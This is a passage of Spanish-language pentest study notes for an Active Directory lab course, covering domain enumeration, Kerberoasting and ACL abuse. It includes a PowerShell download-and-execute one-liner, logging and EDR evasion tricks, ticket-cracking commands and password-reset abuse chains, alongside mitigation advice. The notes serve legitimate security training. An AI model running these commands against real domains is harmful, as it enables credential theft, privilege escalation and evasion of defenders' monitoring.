| `Get-ChildItem Env: \| ft Key,Value` | Devuelve variables de entorno como rutas, nombres de usuario, información del sistema, etc. |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Obtiene el historial de comandos de PowerShell del usuario. Puede contener información sensible como contraseñas o rutas de scripts. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <comandos>"` | Descarga y ejecuta un script directamente desde memoria usando PowerShell. Útil para ejecución sin tocar disco. |

#### Degradar Powershell
El registro de eventos de Powershell se introdujo como una característica con Powershell 3.0 y versiones posteriores. Con eso en mente, podemos intentar llamar a Powershell versión 2.0 o anterior. Si tiene éxito, nuestras acciones desde el shell no se registrarán en el Visor de eventos. 

```
Get-host #Observar la version actual de PowerShell
powershell.exe -version 2  #Verificar la degradacion de PowerShell
get-module  #Ejecutar comando con powershell 2.0
```

El lugar principal para buscar si estamos **escribiendo registros** es en el _PowerShell Operational Log_ encontrado debajo Applications and `Services Logs > Microsoft > Windows > PowerShell > Operational`. Todos los comandos ejecutados en nuestra sesión iniciarán sesión en este archivo. El Windows PowerShell registro ubicado en `Applications and Services Logs > Windows PowerShell` también es un buen lugar para comprobarlo

**Comprobaciones de Seguridad**
```
## Verificar si esta corriendo el Firewall

#Powershell
netsh advfirewall show allprofiles
#CMD
sc query windefend

#Verificar configuraciones especificas de AntiVirus
Get-MpComputerStatus

#Verificar si hay otro usuario actualmente en el host victima
qwinsta
```
### Network Information
| Comando | Descripción |
|---------|-------------|
| `arp -a` | Enumera todos los hosts conocidos almacenados en la tabla ARP. |
| `ipconfig /all` | Imprime la configuración del adaptador de red del host. Permite identificar el segmento de red. |
| `route print` | Muestra la tabla de enrutamiento (IPv4 e IPv6), identificando redes conocidas y rutas compartidas. |
| `netsh advfirewall show allprofiles` | Muestra el estado del firewall del host. Permite saber si está activo y si filtra el tráfico. |

### Windows Management Instrumentation (WMI)

Comandos WMIC para enumeración del sistema

[Cheeatsheet Comandos WMIC](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) 
[Documentacion WMIC](https://learn.microsoft.com/en-us/windows/win32/wmisdk/using-wmi)
| Comando | Descripción |
|---------|-------------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Imprime el nivel del parche y la descripción de las revisiones aplicadas. |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Muestra información básica del host, incluyendo atributos como nombre, dominio, fabricante, modelo y roles. |
| `wmic process list /format:list` | Lista todos los procesos activos en el host. |
| `wmic ntdomain list /format:list` | Muestra información sobre el dominio y los controladores de dominio. |
| `wmic useraccount list /format:list` | Muestra información sobre todas las cuentas locales y cuentas de dominio que hayan iniciado sesión. |
| `wmic group list /format:list` | Muestra información sobre todos los grupos locales. |
| `wmic sysaccount list /format:list` | Vuelca información sobre cuentas del sistema utilizadas como cuentas de servicio. |

```
#Ver información sobre el dominio y el dominio secundario, y el bosque externo en el que nuestro dominio actual confía
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

### Net Commands
Estos comandos pueden ser beneficiosos para nosotros cuando intentamos enumerar información del dominio
Podemos enumerar información como:
- Usuarios locales y de dominio
- Grupos
- Anfitriones
- Usuarios específicos en grupos
- Controladores de dominio
- Requisitos de contraseña
> Se debe tener en cuenta que los comandos de _net.exe_ generalmente son monitoreados por soluciones EDR y pueden revelar rápidamente nuestra ubicación si nuestra evaluación tiene un componente evasivo.

**Comandos `net` para enumeración en redes Windows**

| Comando | Descripción |
|---------|-------------|
| `net accounts` | Muestra información sobre los requisitos de contraseña. |
| `net accounts /domain` | Muestra la política de contraseñas y bloqueo en el dominio. |
| `net group /domain` | Muestra información sobre los grupos del dominio. |
| `net group "Domain Admins" /domain` | Enumera los usuarios con privilegios de administrador de dominio. |
| `net group "domain computers" /domain` | Lista las computadoras unidas al dominio. |
| `net group "Domain Controllers" /domain` | Enumera las cuentas de los controladores de dominio. |
| `net group <domain_group_name> /domain` | Muestra los usuarios que pertenecen a un grupo específico del dominio. |
| `net groups /domain` | Lista todos los grupos del dominio. |
| `net localgroup` | Muestra todos los grupos locales del sistema. |
| `net localgroup administrators /domain` | Enumera los usuarios del grupo "Administrators" en el dominio. |
| `net localgroup Administrators` | Muestra información sobre el grupo local de administradores. |
| `net localgroup administrators [username] /add` | Agrega un usuario al grupo de administradores locales. |
| `net share` | Muestra los recursos compartidos actuales del sistema. |
| `net user <ACCOUNT_NAME> /domain` | Muestra información sobre un usuario específico del dominio. |
| `net user /domain` | Enumera todos los usuarios del dominio. |
| `net user %username%` | Muestra información sobre el usuario actual. |
| `net use x: \\computer\share` | Monta un recurso compartido de red como una unidad local. |
| `net view` | Muestra una lista de computadoras en la red local. |
| `net view /all /domain[:domainname]` | Muestra los recursos compartidos en todos los dominios especificados. |
| `net view \\computer /ALL` | Enumera los recursos compartidos en una computadora específica. |
| `net view /domain` | Muestra una lista de computadoras dentro del dominio. |

```
#Listado de grupos de dominio
net group /domain

#Informacion sobre un usuario de dominio
net user /domain wrouse

#Truco de evasion - Cambiando net por net1 es posible que no se detecten los comandos por el EDR
net1 user 
```

### Dsquery
Es una herramienta de línea de comandos que se puede utilizar para encontrar objetos de Active Directory, existira en un AD que tenga instalado _Active Directory Domain Services Role_ y que de forma predeterminada tiene una DLL en _C:\Windows\System32\dsquery.dll_

[Comodines de Dsquery](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11))

```
#Busqueda de usuarios
dsquery user

#Busqueda de hosts
dsquery computer

#Busqueda de comodines
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

#Usuarios con PASSWD_NOTREQD en userAccountControl - Combinando Dsquery con consultas LDAP
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

#Busqueda de controladores de dominio en el dominio actual (Imprimiendo max 5 resultados)
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

#
```
### LDAP Filtering Explained
LDAP (Lightweight Directory Access Protocol) permite realizar búsquedas avanzadas en Active Directory (AD) usando filtros. Estos filtros son muy potentes cuando se combinan con atributos como userAccountControl y reglas especiales llamadas OIDs (Object Identifiers).

Ejemplo LDAP
```
userAccountControl:1.2.840.113556.1.4.803:=8192
```
- `userAccountControl`: Es el atributo que estamos evaluando (controla cosas como si la cuenta está deshabilitada, requiere contraseña, etc.).

- `1.2.840.113556.1.4.803`: Es un OID que define cómo comparar el valor del atributo (en este caso, comparación exacta de bits).

- `=8192`: Es el valor en decimal del bit que queremos buscar (ej: 8192 = cuenta Smartcard requerida).

**Tipos de OID (Reglas de comparación)**

| OID                       | ¿Qué hace?                                                        | Uso común                                     |
| ------------------------- | ----------------------------------------------------------------- | --------------------------------------------- |
| `1.2.840.113556.1.4.803`  | Coincidencia exacta de bits                                       | Buscar un atributo específico                 |
| `1.2.840.113556.1.4.804`  | Coincidencia parcial (cualquier bit que coincida)                 | Buscar cualquier atributo activo entre varios |
| `1.2.840.113556.1.4.1941` | Coincidencia en la jerarquía (como pertenencia a grupos anidados) | Búsquedas relacionadas con `memberOf`         |

<img width="2576" height="1780" alt="image" src="https://github.com/user-attachments/assets/558046c4-5fbd-4faf-bc16-1f09f7676646" />

**Operadores lógicos**

| Operador | Significado | Ejemplo                             |     |                       |
| -------- | ----------- | ----------------------------------- | --- | --------------------- |
| `&`      | AND (y)     | `(&(objectClass=user)(UAC filter))` |     |                       |
| \`       | \`          | OR (o)                              | \`( | (filtro1)(filtro2))\` |
| `!`      | NOT (no)    | `(!(filtro))`                       |     |                       |

Ejemplos:

```
#Busca todos los objetos tipo usuario que tengan configurado el atributo "Password Can't Change"
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))

#Lo mismo, pero busca usuarios que no tienen ese atributo
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
```
**Solucion Preguntas Modulo**
```
Get-ADUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -Properties Description,MemberOf
```
___________________________________________________________________________________________-

## Kerberoasting - from Linux

Kerberoasting explota SPNs (Service Principal Names). Cualquier usuario del dominio puede solicitar tickets TGS para servicios con SPN; esos TGS están cifrados con el hash NTLM de la cuenta de servicio. Se extraen los TGS y se crakean offline (ej. Hashcat) para intentar recuperar la contraseña en claro de la cuenta de servicio y escalar lateralmente.

Los SPN son identificadores únicos que Kerberos utiliza para asignar una instancia de servicio a una cuenta de servicio en cuyo contexto se ejecuta el servicio

**Requisitos mínimos**

- Credenciales de usuario de dominio (cleartext) o hash NTLM o un shell con contexto de usuario de dominio / SYSTEM / keytab.
- IP o nombre del Domain Controller (<DC_IP> / DC.local).
- Herramientas: Impacket (GetUserSPNs.py), Hashcat (modo 13100), opcional CrackMapExec o similares, wordlists y GPU para cracking.

**Flujo resumido**

1. Enumerar cuentas con SPN en el dominio.
2. Solicitar (dump) los TGS para esas cuentas (todos o específicos).
3. Guardar los TGS a fichero para cracking offline.
4. Crakear los TGS con Hashcat (modo 13100).
5. Si se obtiene contraseña, validar y pivotar (p. ej. autenticarse a servicios, acceder a MSSQL, etc.).

**Comandos (Linux — sintaxis en bash)**

```
# (1) Instalar Impacket desde el repo clonado
sudo python3 -m pip install .

# (2) Listar SPNs (Necesita: Credenciales e IP del DC)
GetUserSPNs.py -dc-ip <DC_IP> DC.local/User
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# (3) Solicitar (dump) todos los TGS para cracking
GetUserSPNs.py -dc-ip <DC_IP> DC.local/User -request -outputfile all_tgs
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

# (4) Solicitar sólo el TGS de un usuario concreto y guardarlo
GetUserSPNs.py -dc-ip <DC_IP> DC.local/User -request-user User -outputfile User_tgs-txt
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs.txt

# (5) Cracking offline con Hashcat (Kerberos TGS etype 23 → modo 13100)
hashcat -m 13100 User_tgs.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 

# (6) Verificar autenticación con las credenciales descubiertas
sudo crackmapexec smb <DC_IP> -u User -p Password
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!

```

**Limitaciones importantes**

- Recuperar la contraseña depende de la fortaleza de la contraseña del account de servicio y de los recursos de cracking (GPU, wordlists, tiempo).
- Tickets TGS son costosos de crakear; si se usan contraseñas fuertes y políticas modernas (AES, contraseñas largas, gMSA), puede ser impracticable.
- Obtener TGS no da ejecución inmediata: se necesita crackear el hash para recuperar credenciales en claro o usar técnicas adicionales.

**Mitigaciones (alto nivel)**

- Usar Managed Service Accounts / gMSA y rotación automática de contraseñas.
- Políticas de contraseñas fuertes y long passphrases para cuentas de servicio.
- Monitorizar y alertar solicitudes masivas/anómalas de TGS (SIEM / detección de Kerberos abuse).
- Minimizar privilegios de cuentas de servicio (no añadir a Domain Admin / evitar memberships innecesarias).
- Habilitar protecciones Kerberos modernas (evitar RC4, usar AES, Kerberos armoring/FAST si aplica).

**Solucion preguntas**
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService
      Account Operators
```

## Kerberoasting - from Windows

### Kerberoasting - Semi Manual method

1. **Enumeración de SPN con setspn.exe**

```
setspn.exe -Q */*
```
2. **Solicitud de TGS a un usuario**
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
`Add-Type -AssemblyName System.IdentityModel`
- Agrega un ensamblado de .NET Framework a PowerShell, permitiendo usar clases de ese espacio de nombres.
(System.IdentityModel contiene clases para trabajar con tokens de seguridad.)

`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <SPN>`
- Crea un objeto de tipo KerberosRequestorSecurityToken y solicita un ticket TGS para el SPN especificado (en este caso, MSSQLSvc/DEV-PRE-SQL...).

Esto solicita el ticket para el usuario desde la sesión actual, como lo hace Rubeus internamente.

También se pueden solicitar todos los tickets a la vez, pero esto incluiría cuentas de computadora, lo cual no es óptimo para Kerberoasting.

3. **Recuperar todos los tickets usando setspn.exe**

```
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
Ahora que los tickets están cargados, podemos usar Mimikatz para extraer los tikets de memory

4. **Extrayendo tickets de la memoria con Mimikatz**
If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files.
```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export  
```
5. **Preparing the Base64 Blob for Cracking**
El codigo debe estar en una sola linea asi que para arreglarlo se usa
```
echo "<base64 blob>" |  tr -d \\n 
```

Se guarda la linea obtenida en el paso anterior, se guarda en un archivo y se convierte a .kirbi

6. **Placing the Output into a File as .kirbi**
```
cat encoded_file | base64 -d > sqldev.kirbi
```

7. **Extracting the Kerberos Ticket using kirbi2john.py**

```
python2.7 kirbi2john.py sqldev.kirbi
```

8. **Modifiying crack_file for Hashcat**
Se modifica el archivo para poder usar hashcar
```
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

9. **Crackear Hash con HashCat**
```
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

### Automated / Tool Based Route

1. **Uso de PowerView para enumerar cuentas SPN**

```
# Importamos PowerView
Import-Module .\PowerView.ps1

# Enumeramos las cuentas con SPN
Get-DomainUser * -spn | select samaccountname
```

2. **Uso de PowerView para dirigirse a un usuario específico**

```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

3. **Exportación de todos los tickets a un archivo CSV**}

```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
cat .\ilfreight_tgs.csv
```

### Usando Rubeus

También podemos utilizar Rubeus desde GhostPack para realizar Kerberoasting aún más rápido y sencillo. Rubeus nos ofrece una variedad de opciones para realizar Kerberoasting.

```
.\Rubeus.exe
```
**Enumerar cuentas Kerberoasteables** - Clasificadas por tipo de cifrado

```
.\Rubeus.exe kerberoast /stats
```

**Solicitar cuentas de Administrador**
Solicitud de cuentas de administrador, especificando que la salida sea en formato Hashcataxax
```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
  admincount=1 - Solicita hash de cuentas de administrador
  /nowrap      - Entrega la salida en una sola linea, para usar con Hashcat
```

**Solicitar Hash para una cuenta especifica de usuario**

```
.\Rubeus.exe kerberoast /ldapfilter:"(samAccountName=svc_vmwaresso)" /nowrap
```

**Mimikatz**
```
hashcat -m 13100 hash_PoweView.txt ../../../Wordlists/rockyou.txt
```

_______________________________________
**Tipos de Cifrado**
Las herramientas de Kerberoasting prefieren el cifrado RC4 (tipo 23) al solicitar TGS-REQ, ya que:

- RC4 es más débil y más fácil de romper con herramientas como Hashcat.
- Otros tipos como AES-128 (tipo 17) y AES-256 (tipo 18) son más seguros y más lentos de descifrar, pero siguen siendo vulnerables si la contraseña es débil.

Ejemplo:

1. Creamos un usuario con SPN: testspn
2. Usamos Rubeus para Kerberoasting:
```
.\Rubeus.exe kerberoast /user:testspn /nowrap
```
3. Se obtiene un ticket TGS cifrado con RC4 ($krb5tgs$23$*...)

Rubeus avisa que si la cuenta soporta AES, devolverá hashes AES a menos que se use /ticket:X o /tgtdeleg para forzar RC4.
4. Confimacion con PowerView
> El atributo msDS-SupportedEncryptionTypes = 0 → usa RC4 por defecto (no se definió tipo de cifrado específico)
```
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

5. Solicitud de TGS de cifrado debil - Degradando el tipo de cifrado?
Se puede agregar el /tgtdeleg para que solo entregue los hashes de los usuarios kerberoasteables con cifrado RC34 (Tipo 23) 
```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
/tgtdeleg
```
> Cabe recalcar que la respuesta es diferente dependiendo de la version del Windows Server

### Mitigación y detección

Para mitigar Kerberoasting, use cuentas de servicio administradas (MSA/gMSA) en lugar de cuentas con contraseñas fijas. Estas generan contraseñas complejas que rotan automáticamente.

Habilite la auditoría de tickets TGS (eventos 4769 y 4770) para detectar actividad anómala. Un número elevado de solicitudes 4769 en poco tiempo puede indicar un ataque.

Evite el uso de RC4 y no asigne SPN a cuentas privilegiadas. Pruebe cambios antes de aplicarlos en producción.

___________________________________________________________________________________

## Access Control List (ACL) Abuse Primer

### Access Control List (ACL) Overview
Las ACL definen quién tiene acceso a qué recurso y con qué nivel. Cada objeto en Active Directory posee una ACL compuesta de varias ACE (Access Control Entries).  
Existen dos tipos de ACL:
- DACL (Discretionary ACL): especifica permisos concedidos o denegados a un objeto.
- SACL (System ACL): registra intentos de acceso a objetos para auditoría.  
Una configuración errónea puede dar privilegios excesivos o innecesarios a usuarios y grupos, generando un riesgo de seguridad.

### Access Control Entries (ACEs)
Una ACE define permisos de un usuario o grupo sobre un objeto.  
Tipos de ACE:
- Access Denied ACE: niega explícitamente acceso.
- Access Allowed ACE: concede explícitamente acceso.
- System Audit ACE: genera registros de auditoría.  

Cada ACE contiene: el SID del usuario/grupo, el tipo de ACE, opciones de herencia hacia objetos hijos y una máscara de acceso con los derechos concedidos.  
Ejemplos de permisos abusables:
- ForceChangePassword → restablecer contraseñas sin conocer la anterior.
- GenericWrite → modificar atributos de un objeto (ej. asignar SPN para Kerberoasting).
- AddSelf → agregarse a grupos de seguridad.
- GenericAll → control total sobre el objeto (resetear contraseñas, modificar membresías, leer LAPS, etc.).

### Why are ACEs Important?
Las ACE pueden ser aprovechadas por atacantes para moverse lateral o verticalmente, establecer persistencia o lograr control total del dominio.  
Son difíciles de detectar mediante herramientas tradicionales, suelen permanecer años sin revisarse y representan vectores útiles cuando las configuraciones más obvias ya fueron corregidas.  
Herramientas como BloodHound y PowerView permiten enumerar y visualizar estas relaciones para explotación.

### ACL Attacks in the Wild
Los abusos de ACL pueden servir para:
- Movimiento lateral
- Escalada de privilegios
- Persistencia  

Escenarios comunes:
- Abusar de permisos de restablecimiento de contraseñas asignados a Help Desk.
- Abusar de derechos de gestión de grupos para añadirse a grupos privilegiados.
- Derechos excesivos heredados de instalaciones de software o configuraciones antiguas.  

Existen muchos otros casos menos comunes, pero la metodología de enumeración con herramientas de AD debe ser flexible para detectar nuevos privilegios.  
Siempre se debe contar con aprobación del cliente antes de ejecutar cambios, documentar todo el proceso y revertir cualquier modificación realizada.


## ACL Enumeration

### Enumerating ACLs with PowerView

Enumerar que usuarios tienen derechos ACL interesante que podamos aprovechar
```
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley    #Configuracion para que el SID busque de manera efectiva

Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}    #Realizar Busqueda especifica (GUID no legible 00299570-246d-11d0-a768-00aa006e0529) - Se úede averiguar en internet
  # $sid -Busqueda por SID (Usuario esecifico)
  # SecurityIdentifier -Dice quien tiene derecho obre un objeto

#Salida entendible para Humanos
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

```
Es importante tener en cuenta que, si buscamos sin la opción ResolveGUIDs, veremos resultados como el siguiente, donde el comando ExtendedRight no nos indica claramente qué entrada ACE tiene el usuario sobre damundsen. Esto se debe a que la propiedad ObjectAceType devuelve un valor GUID ilegible.


### Enumerating ACLs with CMDLETS (Sin herramientas)

**Traducir GUID sin Herramientas**

Arreglando la salida con una busqueda inversa y reasignación del GUID (Si ya se importo PowerView, lo ideal seria ejectar lo siuiente en otro PowerShell)
```
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

**Enumeración de ACL sin Herramientas**

```
#Crear lista de usuarios del dominio
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

#Iterar con un bucle For Each - Se recorre cada linea del txt, se extrae los derechos de acceso (Access Property) y luego con IdentityReference buscamos los derechos de nuestro usuario
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

#Enumeracion de derechos ACL de un usuario especifico "damunsen"
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

  ObjectDN: CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  #CN es el nombre del objeto sobre el cual se tiene derechos
  ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite #Derechos que el usuario tiene sobre los objetos

#Enumerar derechos del grupo Help Desk Level 1
Get-DomainObjectAcl -Identity "Help Desk Level 1" -ResolveGUIDs | Format-Table -AutoSize

#Verificar los grupos anidados a los que pertenece para ver que derechos hereda
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

  CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```
**GenericWrite**
Sobre un Usuario
- Agregar un SPN → Kerberoasting
- Modificar atributos (como scriptPath, description, etc.)

Sobre un Grupo
- Agregar o quitar miembros

Que se acaba de hacer:
- We have control over the user wley whose hash we retrieved earlier in the module (assessment) using Responder and cracked offline using Hashcat to reveal the cleartext password value
- We enumerated objects that the user wley has control over and found that we could force change the password of the user damundsen
- From here, we found that the damundsen user can add a member to the Help Desk Level 1 group using GenericWrite privileges
- The Help Desk Level 1 group is nested into the Information Technology group, which grants members of that group any rights provisioned to the Information Technology group

Continuando
```
#Enumerar derechos del grupo anidado
$itgroupsid = Convert-NameToSid "Information Technology"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

  ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
  ActiveDirectoryRights : GenericAll

#
$adunnsid = Convert-NameToSid adunn
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

  ObjectDN: DC=INLANEFREIGHT,DC=LOCAL
  ObjectAceType: DS-Replication-Get-Changes-In-Filtered-Set
  ObjectAceType: DS-Replication-Get-Changes
```
El resultado anterior muestra que nuestro adunn el usuario tiene DS-Replication-Get-Changes y DS-Replication-Get-Changes-In-Filtered-Set derechos sobre el objeto de dominio. Esto significa que se puede aprovechar a este usuario para realizar un ataque DCSync.

Information Technology grupo tiene **GenericAll** derechos sobre el usuario adunn, lo que significa que podríamos:
- Modificar la membresía del grupo
- Forzar el cambio de contraseña
- Realice un ataque Kerberoasting dirigido e intente descifrar la contraseña del usuario si es débil

### Enumerating ACLs with BloodHound
1. Primero con la informacion recopilada con SharpHound y ya cargada en BloodHound

```
#Ejecutar SharpHound desde el host de ataque (dentro del dominio)
.\SharpHound.exe -c All --zipfilename NombreArchivo
```

2. En "Node Info" (Para usar nuestro usuario como nodo) vamos al apatado "Outbound Control Rights" para visualizar los objetos sobre los cuales tenemos control directo y la cantidad de posibles objeos que podriamos llegar a controlar con rutas de ataque a ACL presionando sobre "Transitive Object Control"
El "First Degree Object Control" nos muestra el primer conjunto de derechos

3. Si presionamos click derecho y vamos a "Help" se nos proporcionara informacion sobre:
- Más información sobre el derecho específico, las herramientas y los comandos que se pueden utilizar para llevar a cabo este ataque
- Consideraciones sobre seguridad operativa (Opsec)
- Referencias externas.

4.   Si presionamos sobre el valor de "Transitive Object Control" es mostrara la cadena de ataque que se llevo en el apartado anterior, donde con el menú de ayuda podriamos llevar a cabo cada ataque

5.  Uso de consultas prediseñadas de BloodHound en la seccion de "Analysis" para verificar que el usuario que "adunn" tiene derechos DCSync

<img width="1027" height="761" alt="image" src="https://github.com/user-attachments/assets/5aa1c582-174e-4bcd-a923-c413a961e98e" />

Obtener el ObjectAceType de usuario sobre Grupo (Solucion pregunta HTB Academy)
```
#Primero importar el PowerView
Get-ObjectAcl -Identity "<NombreExactoDelGrupo>" -ResolveGUIDs |
Where-Object { $_.SecurityIdentifier -eq "<SID_de_forend>" } |
Select-Object IdentityReference, ObjectAceType, ActiveDirectoryRights
```

## ACL Abuse Tactics
Con base a lo que se tiene y se ha enumerado (Usuario wley obtenido con Hash NTLMv2 y los permisos de cambio de contraseña que este tiene sobre Adunn)
1. Utilice el wley usuario para cambiar la contraseña del damundsen usuario
2. Autenticarse como el damundsen usuario y apalancamiento GenericWrite derechos para agregar un usuario que controlamos al Help Desk Level 1 grupo
3. Aproveche la membresía de grupos anidados en el Information Technology grupo y apalancamiento GenericAll derechos para tomar el control de la adunn usuario

1. **Cambio de contraseña**
```
#Crea un objeto con la contraseña de wley, forsando a que sea un objeto seguro para poder utilizarlo en PowerShell (Aun siendo texto plano)
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force

#Objeto que sirve para autenticarse como wley - Util para trabajar con PowerView
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

#Se crea un objeto con las nuevas credenciales para el usuario damundsen (Todavia sin asignar)
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

#Se efectua el cambio de contraseña con PowerView para damundsen proporcionandole el objeto de la nueva contraseña y especificando el objeto de las credenciales de quien cambia la contraseña
cd C:\Tools\
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
El cambio de contraseñas se puede realizar igualmente desde la maquina Linux del atacante, usando la herramienta **pth-net** del [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
```
pth-net rpc password DC.local/wley:Password123@DC -U DC.local/wley -N 'damundsen' -P 'Pwn3d_by_ACLs!'
  pth-net use DC.local/damundsen:Pwn3d_by_ACLs!@DC  #Verificar Autenticacion
```
2. **Autenticacion con damundsen y Agregarnos al Help Desk Level 1** A traves de los permisos de GenericAll

```
#Inicio de sesion (Creacion de objetos seguros, con contraseña y credenciales de usuario)
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

#Luego se comprueba si el usuario no es miembro del grupo objetivo (Tambien se peude hacer con pth-toolkit)
#?Get-DomainGroupMember -Identity "Help Desk Level 1" -Recurse | Where-Object { $_.MemberName -match "damundsen" }
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

pth-net rpc groupmem DC.local/damundsen:Pwn3d_by_ACLs!@DC "Help Desk Level 1"
  pth-net rpc addmem DC.local/damundsen:Pwn3d_by_ACLs!@DC "Help Desk Level 1" damundsen #Agregar a damundsen al grupo objetivo

#Agregar damundsen al grupo Help Desk Level 1
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

#Comprobacion de que realmente se agrego al grupo
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```
El cliente pide que no cambiemos la contraseña de adunn ya que es administrador (Lo cual podriamos hacer ya que tenemos permisos de GenericAll que tenmos en Help Desk Level 1 y que la heredamos del grupo de Tecnology Information)
Lo que se va hacer es abusar de los ACL (GenericAll) para crear un SPN falso en la cuenta de adunn para convertirlo en un objetivo Kerberoasteable (Aunque antes no lo fuera)

**Creando un SPN falso**
```
#Con PowerView insertamos un "servicePrincipalName" ficticio en la cuenta ibjetivo
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

#Luego se hace un ataque comun de Kerberoast al usuario adunn
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

### Cleanup
Ya que tenemos el hash y lo desciframos con HashCat hay que limpiar el rastro que dejamos, para lo cual seguimos estos pasos

1. Elimine el SPN falso que creamos en el adunn usuario.
2. Retire el damundsen usuario de la Help Desk Level 1 grupo
3. Establezca la contraseña para el damundsen el usuario vuelve a su valor original (si lo conocemos) o hace que nuestro cliente lo configure/alerte al usuario
Este orden es importante porque si eliminamos primero al usuario del grupo, entonces no tendremos los derechos para eliminar el SPN falso.

```
#Eliminar SPN falso
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

#Eliminar a damundsen del grupo Help Desk Level 1
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

#Confirmacion de la eliminacion del usuario
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```
### Detection and Remediation

- Auditoría y limpieza: Revisar periódicamente Active Directory y eliminar ACL peligrosas con herramientas como BloodHound.
- Monitoreo de grupos: Vigilar cambios en grupos críticos del dominio para detectar intentos de abuso.
- Monitoreo de cambios en ACL:
